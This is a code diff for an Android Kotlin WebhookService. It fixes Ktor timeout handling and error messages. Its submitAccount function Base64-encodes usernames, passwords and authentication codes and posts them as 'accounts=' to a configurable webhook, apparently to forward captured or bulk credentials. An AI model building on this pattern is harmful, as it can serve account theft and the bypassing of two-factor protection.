@@ -4,8 +4,9 @@ import android.util.Base64
 import io.ktor.client.HttpClient
 import io.ktor.client.call.body
 import io.ktor.client.engine.okhttp.OkHttp
+import io.ktor.client.plugins.HttpTimeout  // ✅ ADD THIS IMPORT
 import io.ktor.client.plugins.contentnegotiation.ContentNegotiation
-import io.ktor.client.plugins.timeout
+import io.ktor.client.plugins.timeout  // ✅ Keep this for timeout {} DSL
 import io.ktor.client.request.post
 import io.ktor.client.request.setBody
 import io.ktor.client.statement.HttpResponse
@@ -22,9 +23,22 @@ import kotlinx.serialization.json.jsonPrimitive
 import java.util.Random
 
 class WebhookService {
+    
+    // ✅ FIXED: HttpClient with HttpTimeout plugin installed
     private val client = HttpClient(OkHttp) {
+        
+        // ✅ INSTALL HttpTimeout plugin - Required for timeout {} DSL
+        install(HttpTimeout) {
+            requestTimeoutMillis = 15_000   // Default: 15 seconds
+            connectTimeoutMillis = 10_000   // Default: 10 seconds  
+            socketTimeoutMillis = 15_000    // Default: 15 seconds
+        }
+        
         install(ContentNegotiation) {
-            json(Json { ignoreUnknownKeys = true })
+            json(Json { 
+                ignoreUnknownKeys = true
+                isLenient = true
+            })
         }
     }
 
@@ -49,16 +63,27 @@ class WebhookService {
             val response: HttpResponse = client.post(webhookUrl) {
                 contentType(ContentType.Text.Plain)
                 setBody(payload)
-                timeout { requestTimeoutMillis = 10000 }
+                // ✅ Now this works because HttpTimeout plugin is installed above
+                timeout { 
+                    requestTimeoutMillis = 10_000  // Per-request override: 10 seconds
+                }
             }
 
             parseResponse(response)
         } catch (e: Exception) {
-            WebhookResult(false, message = "Connection error: ${e.message}")
+            WebhookResult(
+                success = false, 
+                message = "Connection error: ${e.localizedMessage ?: e.message ?: "Unknown error"}"
+            )
         }
     }
 
-    suspend fun submitAccount(webhookUrl: String, username: String, password: String, authCode: String): WebhookResult = withContext(Dispatchers.IO) {
+    suspend fun submitAccount(
+        webhookUrl: String, 
+        username: String, 
+        password: String, 
+        authCode: String
+    ): WebhookResult = withContext(Dispatchers.IO) {
         try {
             val convertedStr = "$username:$password|||$authCode||"
             val payload = "accounts=${Base64.encodeToString(convertedStr.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)}"
@@ -66,12 +91,18 @@ class WebhookService {
             val response: HttpResponse = client.post(webhookUrl) {
                 contentType(ContentType.Text.Plain)
                 setBody(payload)
-                timeout { requestTimeoutMillis = 10000 }
+                // ✅ Now this works because HttpTimeout plugin is installed
+                timeout { 
+                    requestTimeoutMillis = 10_000
+                }
             }
 
             parseResponse(response, response.status.value)
         } catch (e: Exception) {
-            WebhookResult(false, message = "Connection error: ${e.message}")
+            WebhookResult(
+                success = false, 
+                message = "Connection error: ${e.localizedMessage ?: e.message ?: "Unknown error"}"
+            )
         }
     }
 
@@ -80,7 +111,7 @@ class WebhookService {
         
         return try {
             if (bodyText.isEmpty()) {
-                return WebhookResult(false, message = "Empty response")
+                return WebhookResult(success = false, message = "Empty response")
             }
 
             val json = Json.parseToJsonElement(bodyText).jsonObject
@@ -98,7 +129,7 @@ class WebhookService {
                 message = "Success: $successCount | Failed: $failedCount"
             )
         } catch (e: Exception) {
-            WebhookResult(false, message = "Invalid response format")
+            WebhookResult(success = false, message = "Invalid response format: ${e.localizedMessage}")
         }
     }
 }
